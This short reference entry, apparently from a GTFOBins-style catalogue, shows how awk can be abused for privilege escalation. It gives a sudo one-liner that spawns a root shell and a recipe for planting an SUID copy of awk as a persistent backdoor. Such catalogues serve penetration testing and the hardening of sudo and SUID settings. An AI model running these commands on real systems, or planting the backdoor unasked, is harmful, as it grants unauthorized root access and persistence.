***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo awk 'BEGIN {system("/bin/sh")}'
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * sudo sh -c 'cp $(which awk) .; chmod +s ./awk'

      ./awk 'BEGIN {system("/bin/sh")}'
